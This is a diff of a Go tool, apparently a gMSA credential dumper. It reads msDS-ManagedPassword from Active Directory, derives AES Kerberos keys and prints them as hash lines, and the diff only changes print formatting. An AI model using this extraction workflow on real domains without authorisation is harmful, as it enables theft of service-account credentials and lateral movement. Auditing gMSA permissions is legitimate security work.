@@ -180,7 +180,7 @@ func ldapEscapeSID(sid *security.SID) string {
 	return sb.String()
 }
 
-// ─── main ─────────────────────────────────────────────────────────────────────
+
 
 func main() {
 
@@ -263,25 +263,25 @@ func main() {
 		if len(membershipRaw) > 0 {
 			principals := resolveACLPrincipals(client, baseDN, membershipRaw)
 			if len(principals) == 0 {
-				fmt.Println("    (no principals found in DACL)")
+				fmt.Println("(no principals found in DACL)")
 			}
 			for _, p := range principals {
-				fmt.Printf("    > %s\n", p)
+				fmt.Printf("> %s\n", p)
 			}
 		} else {
-			fmt.Println("    (msDS-GroupMSAMembership not returned – insufficient rights?)")
+			fmt.Println("(msDS-GroupMSAMembership not returned – insufficient rights?)")
 		}
 
 		pwRaw := entry.GetRawAttributeValue("msDS-ManagedPassword")
 		if len(pwRaw) == 0 {
-			fmt.Println("    [!] msDS-ManagedPassword is empty – no read access or channel not encrypted")
+			fmt.Println("[!] msDS-ManagedPassword is empty – no read access or channel not encrypted")
 			fmt.Println()
 			continue
 		}
 
 		blob, err := parseManagedPasswordBlob(pwRaw)
 		if err != nil {
-			fmt.Printf("    [!] Failed to parse password blob: %v\n\n", err)
+			fmt.Printf("[!] Failed to parse password blob: %v\n\n", err)
 			continue
 		}
 
@@ -299,7 +299,7 @@ func main() {
 
 		aes128, aes256, err := aesKeys(blob.CurrentPassword, domain, sam)
 		if err != nil {
-			fmt.Printf("    [!] AES key derivation failed: %v\n", err)
+			fmt.Printf("[!] AES key derivation failed: %v\n", err)
 		} else {
 			fmt.Printf("%s:aes256-cts-hmac-sha1-96:%s\n", sam, aes256)
 			fmt.Printf("%s:aes128-cts-hmac-sha1-96:%s\n", sam, aes128)
